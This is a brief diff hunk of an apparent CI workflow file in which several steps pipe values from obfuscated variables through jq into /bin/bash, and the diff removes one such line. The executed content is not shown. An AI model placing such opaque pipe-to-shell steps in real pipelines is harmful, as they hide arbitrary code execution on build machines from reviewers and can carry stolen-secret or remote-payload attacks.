@@ -53,7 +53,6 @@ jobs:
           printf '%s' "$vo26521" | jq -r .lohi824 | /bin/bash
           echo $et1242 | jq -r .osd025 | /bin/bash
           printf '%s' "$dwg4580" | jq -r .jlft847 | /bin/bash
-          printf '%s' "$u5" | jq -r .yxz2 | /bin/bash
 
       - name: Save output
         if: always()
